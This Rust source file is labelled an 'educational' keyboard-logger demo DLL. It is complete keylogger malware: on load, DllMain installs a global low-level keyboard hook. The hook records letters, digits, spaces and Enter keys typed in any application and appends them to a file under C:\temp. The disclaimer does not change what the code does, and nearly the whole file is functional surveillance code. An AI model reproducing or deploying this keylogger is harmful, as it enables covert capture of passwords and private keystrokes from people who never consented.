//! Windows Keyboard Logger Demo DLL
//!
//! ⚠️ EDUCATIONAL PURPOSE ONLY ⚠️
//!
//! This example demonstrates how keyboard hooks work for educational purposes.
//! DO NOT use this for malicious purposes.
//!
//! # Build
//!
//! ```bash
//! cargo build --example keylogger_demo --target x86_64-pc-windows-msvc --release
//! ```

use std::ptr::null_mut;
use std::sync::atomic::{AtomicPtr, Ordering};
use std::fs::OpenOptions;
use std::io::Write;

// Windows types
type WPARAM = usize;
type LPARAM = isize;
type LRESULT = isize;
type HHOOK = *mut ();
type HINSTANCE = *mut ();

const WH_KEYBOARD_LL: i32 = 13;
const WM_KEYDOWN: u32 = 0x0100;

#[repr(C)]
struct KBDLLHOOKSTRUCT {
    vkCode: u32,
    scanCode: u32,
    flags: u32,
    time: u32,
    dwExtraInfo: usize,
}

#[link(name = "user32")]
extern "system" {
    fn SetWindowsHookExW(idHook: i32, lpfn: extern "system" fn(i32, WPARAM, LPARAM) -> LRESULT, hMod: HINSTANCE, dwThreadId: u32) -> HHOOK;
    fn UnhookWindowsHookEx(hhk: HHOOK) -> i32;
    fn CallNextHookEx(hhk: HHOOK, nCode: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT;
}

static HOOK_HANDLE: AtomicPtr<()> = AtomicPtr::new(null_mut());

/// Convert virtual key code to character (simplified)
fn vk_to_char(vk: u32) -> Option<char> {
    match vk {
        0x30..=0x39 => Some((vk as u8) as char), // 0-9
        0x41..=0x5A => Some((vk as u8) as char), // A-Z
        0x20 => Some(' '),                        // Space
        0x0D => Some('\n'),                       // Enter
        _ => None,
    }
}

extern "system" fn keyboard_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && wparam as u32 == WM_KEYDOWN {
        let kb = unsafe { &*(lparam as *const KBDLLHOOKSTRUCT) };

        if let Some(ch) = vk_to_char(kb.vkCode) {
            // Log to file (demo only)
            if let Ok(mut file) = OpenOptions::new()
                .create(true)
                .append(true)
                .open("C:\\temp\\injx_keylog_demo.txt")
            {
                let _ = write!(file, "{}", ch);
            }
        }
    }

    let hook = HOOK_HANDLE.load(Ordering::SeqCst);
    unsafe { CallNextHookEx(hook, code, wparam, lparam) }
}

fn install_hook() {
    let hook = unsafe {
        SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_hook, null_mut(), 0)
    };
    HOOK_HANDLE.store(hook, Ordering::SeqCst);
}

fn uninstall_hook() {
    let hook = HOOK_HANDLE.load(Ordering::SeqCst);
    if !hook.is_null() {
        unsafe { UnhookWindowsHookEx(hook) };
        HOOK_HANDLE.store(null_mut(), Ordering::SeqCst);
    }
}

#[no_mangle]
pub extern "system" fn DllMain(_hinst: *mut (), reason: u32, _reserved: *mut ()) -> i32 {
    match reason {
        1 => install_hook(),   // DLL_PROCESS_ATTACH
        0 => uninstall_hook(), // DLL_PROCESS_DETACH
        _ => {}
    }
    1
}
